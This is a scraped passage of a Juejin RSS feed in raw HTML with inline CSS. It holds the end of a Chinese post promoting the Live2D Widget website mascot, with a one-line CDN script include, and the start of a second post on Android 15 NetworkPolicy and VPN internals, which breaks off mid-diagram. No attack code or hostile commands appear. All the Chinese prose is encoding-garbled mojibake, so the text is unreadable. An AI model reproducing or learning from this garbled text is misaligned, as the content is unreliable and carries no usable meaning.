pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åŒå€¦äº†é™æ€ç½‘é¡µçš„å†°å†·ä¸å•è°ƒï¼ŸLive2D Widget èƒ½å°†ä¸€ä¸ªç”ŸåŠ¨ã€å¯çˆ±çš„çœ‹æ¿å¨˜è½»æ¾å¸¦å…¥ä½ çš„ç½‘ç«™ã€‚åªéœ€ä¸€è¡Œä»£ç ï¼Œè¿™ä¸ªç”± TypeScript é©±åŠ¨çš„å¼€æºé¡¹ç›®å³å¯ä¸ºåšå®¢ã€ä¸ªäººä¸»é¡µæˆ–ä»»ä½•ç½‘é¡µèµ‹äºˆçµåŠ¨çš„ç”Ÿå‘½ã€‚å¥¹ä¸ä»…ä¼šçœ¨çœ¼ã€è½¬å¤´ï¼Œè¿˜èƒ½ä¸è®¿å®¢è¿›è¡Œç®€å•çš„äº’åŠ¨ï¼Œç¬é—´æå‡ç½‘ç«™çš„è¶£å‘³æ€§ä¸äº²å’ŒåŠ›ã€‚æ— è®ºæ˜¯æŠ€æœ¯æå®¢è¿½æ±‚çš„å¯å®šåˆ¶æ€§ï¼Œè¿˜æ˜¯æ™®é€šç”¨æˆ·å‘å¾€çš„è½»æ¾é›†æˆï¼ŒLive2D Widget éƒ½èƒ½æ»¡è¶³ã€‚è·Ÿéšæœ¬æ–‡ï¼Œä¸€åˆ†é’Ÿå”¤é†’ä½ çš„ç½‘é¡µï¼Œè®©æ•°å­—ä¸–ç•Œå¤šä¸€ä½æ¸©æš–é™ªä¼´ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd576edbe3ad41b1936bf7d5f7597118~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=S2GWwDDWOBKxw5BHsbPTxmr6mKM%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">ğŸ¯é¡¹ç›®ä»‹ç»</h2>
<ul>
<li>â€¢Â <strong>é¡µé¢äº’åŠ¨</strong>ï¼šåœ¨ç½‘é¡µä¸­æ·»åŠ  Live2D çœ‹æ¿å¨˜</li>
<li>â€¢Â <strong>æ˜“äºé›†æˆ</strong>ï¼š æ ¸å¿ƒä»£ç ç”± TypeScript ç¼–å†™ï¼Œæ˜“äºé›†æˆï¼Œåªéœ€ä¸€è¡Œä»£ç ï¼Œå³å¯ä¸ºç½‘ç«™æ·»åŠ çœ‹æ¿å¨˜</li>
<li>â€¢Â <strong>è½»é‡çº§è®¾è®¡</strong>ï¼šé™¤Live2Dæ ¸å¿ƒåº“å¤–æ— é¢å¤–ä¾èµ–ï¼ŒåŠ è½½è¿…é€Ÿ</li>
<li>â€¢Â <strong>é«˜åº¦å¯å®šåˆ¶</strong>ï¼šæ”¯æŒå¤šç§é…ç½®é€‰é¡¹ï¼Œå®Œç¾é€‚é…ä½ çš„ç½‘ç«™é£æ ¼</li>
</ul>
<p>githubåœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fstevenjoezhang%2Flive2d-widget%2F" title="https://github.com/stevenjoezhang/live2d-widget/" target="_blank" ref="nofollow noopener noreferrer">github.com/stevenjoezhâ€¦</a></p>
<p>å®˜ç½‘åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.live2d.com%2Fen%2F" title="https://www.live2d.com/en/" target="_blank" ref="nofollow noopener noreferrer">www.live2d.com/en</a></p>
<p>è¯¥é¡¹ç›®ç›®å‰åœ¨githubä¸Šå·²æœ‰Â <strong>10.4k</strong>Â â­ï¸ star</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/56226e3cc71d4a5a9cce847368a88ce8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=HgYpHhaZIZ0%2FfGufjdRGh5HevKc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">âš¡å¿«é€Ÿå¼€å§‹ï¼šä¸€åˆ†é’Ÿé›†æˆ</h2>
<p>å¯¹äºå¤§å¤šæ•°ç”¨æˆ·æ¥è¯´ï¼Œé›†æˆè¿‡ç¨‹ç®€å•å¾—ä»¤äººæƒŠå–œï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!--Â åªéœ€åœ¨é¡µé¢ä¸­æ·»åŠ è¿™è¡Œä»£ç Â --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>Â <span class="hljs-attr">src</span>=<span class="hljs-string">"https://fastly.jsdelivr.net/npm/live2d-widgets@1.0.0/dist/autoload.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>æˆ‘çš„åšå®¢é¡µé¢Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fxiuji008.github.io%2F" title="https://xiuji008.github.io/" target="_blank" ref="nofollow noopener noreferrer">xiuji008.github.io/</a>Â å·²ç»é›†æˆäº†ï¼Œå®¶äººä»¬å¯ä»¥ç§»æ­¥è¿‡å»çœ‹çœ‹æ•ˆæœï¼Œä»¥ä¸‹æ˜¯ä¸€äº›æ•ˆæœå›¾</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d63dcb3ef48413aabc0193f150e9f58~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=d3P9XCVGoCsNmrV3NsKGmYtwuRw%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17cf9f6e9ca848b49f05292f6bb2dbcc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=UTcCSB4AvxQ7rPlmuAc7puEUdKQ%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/052107358d3d48228059f96ac18c0c86~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=%2BiuQOuSiZC%2Bc9lxG4tYzci%2BMXlg%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a1c7f24f20b74312ae3fafb56c13353a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=xjXL%2FxU%2F8RBlrtECJzR2QbMAP9o%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5a0ff90acb3946908e8104dbe2ea4356~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=X6B6kvk5NEWTSUT3lPiBXR1CFUk%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a6fd8c0e73c467a9bbd03365d57556e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=Ca4uXQBX3g7jCnr5RMsRSAHoI98%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47e26f3e986144278e69c67da096f1b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=IN8HQd6o0RjQarzh8XYPywFWaKc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">ğŸ–ï¸è¿›é˜¶</h2>
<p>å¦‚æœä½ æ˜¯å°ç™½ï¼Œæˆ‘ä»¬é€šè¿‡ä¸Šè¾¹ä»‹ç»çš„é‚£è¡Œä»£ç å°±å·²ç»æŠŠçœ‹æ¿å¨˜é›†æˆè¿›æ¥äº†ã€‚ä½†æ˜¯å¦‚æœä½ æƒ³è®©çœ‹æ¿å¨˜æ›´é€‚åˆä½ çš„ç½‘ç«™ï¼Œä½ å¯ä»¥é€šè¿‡è¿›ä¸€æ­¥çš„é…ç½®åŠå¼€å‘æ¥å®Œæˆï¼Œæ„Ÿå…´è¶£çš„å®¶äººä»¬å¯ä»¥è‡ªè¡Œç ”ç©¶ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/29ac25e4a2d549359792aceaf296dcee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=MnBOvLdv%2BY5TjZ4qm%2FELZIRYYSA%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b028c73e1a0482dbb5d2cd93f0fcd87~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=vfxJ9FSZzhz9QD0nXCE9zxilucE%3D" alt="" loading="lazy"/></p>
<p>ç›¸å…³æŠ€æœ¯åšæ–‡ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.fghrsh.net%2Fpost%2F123.html" target="_blank" title="https://www.fghrsh.net/post/123.html" ref="nofollow noopener noreferrer">www.fghrsh.net/post/123.htâ€¦</a></p>
<h2 data-id="heading-3">ğŸ“ æ€»ç»“ï¼šè®©ç½‘é¡µæ´»èµ·æ¥</h2>
<p>Live2D Widgetä¸ä»…ä»…æ˜¯ä¸€ä¸ªæŠ€æœ¯é¡¹ç›®ï¼Œå®ƒä»£è¡¨äº†ç½‘é¡µäº¤äº’çš„æ–°å¯èƒ½ã€‚åœ¨è¿™ä¸ªæ•°å­—åŒ–çš„æ—¶ä»£ï¼Œä¸€ä¸ªçµåŠ¨çš„çœ‹æ¿å¨˜èƒ½å¤Ÿï¼š</p>
<ul>
<li>â€¢ æå‡ç”¨æˆ·ä½“éªŒå’Œåœç•™æ—¶é—´</li>
<li>â€¢ å¢åŠ ç½‘ç«™çš„ç‰¹è‰²å’Œè®°å¿†ç‚¹</li>
<li>â€¢ å±•ç¤ºæŠ€æœ¯å®åŠ›å’Œåˆ›æ„ç²¾ç¥</li>
</ul>
<p>æ— è®ºä½ æ˜¯æŠ€æœ¯çˆ±å¥½è€…ã€åšä¸»è¿˜æ˜¯ç½‘ç«™å¼€å‘è€…ï¼ŒLive2D Widgetéƒ½èƒ½ä¸ºä½ çš„é¡¹ç›®å¢æ·»ç‹¬ç‰¹çš„é­…åŠ›ã€‚ç«‹å³å°è¯•ï¼Œè®©ä½ çš„ç½‘ç«™æ‹¥æœ‰ä¸€ä¸ªéšæ—¶é™ªä¼´è®¿å®¢çš„å¯çˆ±ä¼™ä¼´å§ï¼</p>
<p>è®©æŠ€æœ¯æ›´æœ‰æ¸©åº¦ï¼Œè®©ç½‘é¡µæ›´æœ‰ç”Ÿå‘½ï¼ğŸš€</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android 15ç½‘ç»œå­ç³»ç»Ÿæ·±åº¦è§£æï¼ˆäºŒï¼‰ï¼šNetworkPolicyæµé‡æ§åˆ¶ã€VPNæ¡†æ¶ä¸ç½‘ç»œä¼˜åŒ–å…¨è§£æ]]></title>    <link>https://juejin.cn/post/7600863478929915923</link>    <guid>https://juejin.cn/post/7600863478929915923</guid>    <pubDate>2026-01-30T13:01:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600863478929915923" data-draft-id="7600994087587561491" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android 15ç½‘ç»œå­ç³»ç»Ÿæ·±åº¦è§£æï¼ˆäºŒï¼‰ï¼šNetworkPolicyæµé‡æ§åˆ¶ã€VPNæ¡†æ¶ä¸ç½‘ç»œä¼˜åŒ–å…¨è§£æ"/> <meta itemprop="keywords" content="Android,ç½‘ç»œåè®®,æ€§èƒ½ä¼˜åŒ–"/> <meta itemprop="datePublished" content="2026-01-30T13:01:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å†¬å¥‡Lab"/> <meta itemprop="url" content="https://juejin.cn/user/1857501105781193"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android 15ç½‘ç»œå­ç³»ç»Ÿæ·±åº¦è§£æï¼ˆäºŒï¼‰ï¼šNetworkPolicyæµé‡æ§åˆ¶ã€VPNæ¡†æ¶ä¸ç½‘ç»œä¼˜åŒ–å…¨è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1857501105781193/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å†¬å¥‡Lab
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T13:01:53.000Z" title="Fri Jan 30 2026 13:01:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»18åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€</h2>
<p>åœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬æ·±å…¥æ¢ç´¢äº†ConnectivityServiceçš„ç½‘ç»œç®¡ç†æ¡†æ¶ã€‚ä»Šå¤©ï¼Œæˆ‘ä»¬å°†èšç„¦äºç½‘ç»œå­ç³»ç»Ÿçš„å¦å¤–ä¸¤ä¸ªæ ¸å¿ƒåŠŸèƒ½ï¼š<strong>ç½‘ç»œç­–ç•¥ç®¡ç†</strong>å’Œ<strong>VPNæ¡†æ¶</strong>ã€‚</p>
<h3 data-id="heading-1">ä¸ºä»€ä¹ˆéœ€è¦ç½‘ç»œç­–ç•¥ç®¡ç†ï¼Ÿ</h3>
<p>æƒ³è±¡è¿™æ ·çš„åœºæ™¯ï¼š</p>
<p><strong>åœºæ™¯1ï¼šæµé‡å¤±æ§</strong></p>
<pre><code class="hljs language-diff" lang="diff">ç”¨æˆ·æœˆåº•æ”¶åˆ°è¿è¥å•†çŸ­ä¿¡ï¼š"æ‚¨çš„æµé‡å·²ç”¨å®Œ95%"
æŸ¥çœ‹ç³»ç»Ÿè®¾ç½®å‘ç°ï¼š
<span class="hljs-deletion">- æŸä¸ªåå°åº”ç”¨å·å·ä¸‹è½½äº†2GBæ›´æ–°åŒ…</span>
<span class="hljs-deletion">- å¤šä¸ªåº”ç”¨åœ¨åå°åŒæ­¥æ•°æ®</span>
<span class="hljs-deletion">- ç³»ç»ŸæœåŠ¡æŒç»­ä¸Šä¼ ç»Ÿè®¡æ•°æ®</span>
</code></pre>
<p><strong>åœºæ™¯2ï¼šç”µé‡å‘Šæ€¥</strong></p>
<pre><code class="hljs language-diff" lang="diff">ç”¨æˆ·å¤–å‡ºå‘ç°ï¼š
<span class="hljs-deletion">- æ‰‹æœºåªå‰©15%ç”µé‡</span>
<span class="hljs-deletion">- ä½†è‡³å°‘è¿˜è¦2å°æ—¶æ‰èƒ½å……ç”µ</span>
<span class="hljs-deletion">- å¾ˆå¤šåº”ç”¨è¿˜åœ¨åå°è”ç½‘æ¶ˆè€—ç”µé‡</span>
</code></pre>
<p>è¿™æ—¶å€™ï¼ŒAndroidçš„**NetworkPolicyï¼ˆç½‘ç»œç­–ç•¥ï¼‰**ç³»ç»Ÿå°±æ´¾ä¸Šç”¨åœºäº†ï¼</p>
<h3 data-id="heading-2">æœ¬æ–‡å†…å®¹æ¦‚è§ˆ</h3>
<ol>
<li>
<p><strong>NetworkPolicyæµé‡æ§åˆ¶</strong></p>
<ul>
<li>NetworkPolicyManagerServiceæ¶æ„</li>
<li>Data Saverçœæµæ¨¡å¼</li>
<li>æŒ‰æµé‡è®¡è´¹ç½‘ç»œè¯†åˆ«</li>
<li>æµé‡ç»Ÿè®¡ä¸é™åˆ¶</li>
</ul>
</li>
<li>
<p><strong>VPNæ¡†æ¶æ·±åº¦è§£æ</strong></p>
<ul>
<li>VpnServiceå·¥ä½œåŸç†</li>
<li>TUN/TAPè™šæ‹Ÿç½‘å¡</li>
<li>VPNè·¯ç”±é…ç½®</li>
<li>Always-on VPN</li>
</ul>
</li>
<li>
<p><strong>ç½‘ç»œæ€§èƒ½ä¼˜åŒ–</strong></p>
<ul>
<li>æµé‡ä¼˜åŒ–æŠ€å·§</li>
<li>DNSä¼˜åŒ–</li>
<li>è¿æ¥æ± ç®¡ç†</li>
<li>ç½‘ç»œè¯Šæ–­å·¥å…·</li>
</ul>
</li>
<li>
<p><strong>Android 15æ–°ç‰¹æ€§</strong></p>
<ul>
<li>eBPFç½‘ç»œç­–ç•¥</li>
<li>VPNæ”¹è¿›</li>
<li>ç½‘ç»œåˆ‡ç‰‡æ”¯æŒ</li>
</ul>
</li>
</ol>
<p>è®©æˆ‘ä»¬å¼€å§‹è¿™æ®µæ·±å…¥Androidç½‘ç»œæ ¸å¿ƒçš„æ—…ç¨‹ï¼</p>
<hr/>
<h2 data-id="heading-3">ä¸€ã€NetworkPolicyæµé‡æ§åˆ¶æ·±åº¦è§£æ</h2>
<h3 data-id="heading-4">1.1 NetworkPolicyManagerServiceæ¶æ„æ€»è§ˆ</h3>
<p><strong>æºç ä½ç½®</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">packages/modules/Connectivity/service/src/com/android/server/net/NetworkPolicyManagerService.java
</code></pre>
<h4 data-id="heading-5">æ¶æ„å›¾</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9db9684602f34435b9f8a79f74847575~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770382913&amp;x-signature=S9bxGlNgI9ZQbzajGT%2BqayJ%2Bn48%3D" alt="08-01-network-policy-architecture.png" loading="lazy"/></p>
<p><strong>æ ¸å¿ƒèŒè´£</strong>ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   NetworkPolicyManagerService æ ¸å¿ƒåŠŸèƒ½  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ <span class="hljs-number">1.</span> æµé‡ç›‘æ§                             â”‚
â”‚    - å®æ—¶ç»Ÿè®¡åº”ç”¨æµé‡                   â”‚
â”‚    - æŒ‰UID/Interfaceç»Ÿè®¡                â”‚
â”‚    - å†å²æµé‡è®°å½•                       â”‚
â”‚                                        â”‚
â”‚ <span class="hljs-number">2.</span> ç­–ç•¥æ‰§è¡Œ                             â”‚
â”‚    - Data Saveræ¨¡å¼                    â”‚
â”‚    - App Standbyé™åˆ¶                   â”‚
â”‚    - æŒ‰æµé‡è®¡è´¹ç½‘ç»œæ§åˆ¶                 â”‚
â”‚                                        â”‚
â”‚ <span class="hljs-number">3.</span> æµé‡é™åˆ¶                             â”‚
â”‚    - åå°æ•°æ®ç¦ç”¨                       â”‚
â”‚    - æµé‡é…é¢ç®¡ç†                       â”‚
â”‚    - é˜²ç«å¢™è§„åˆ™                         â”‚
â”‚                                        â”‚
â”‚ <span class="hljs-number">4.</span> ç½‘ç»œè¯†åˆ«                             â”‚
â”‚    - Metered/UnmeteredåŒºåˆ†             â”‚
â”‚    - <span class="hljs-built_in">WiFi</span>/ç§»åŠ¨ç½‘ç»œåˆ¤æ–­                  â”‚
â”‚    - è¿è¥å•†è®¡è´¹ç­–ç•¥                     â”‚
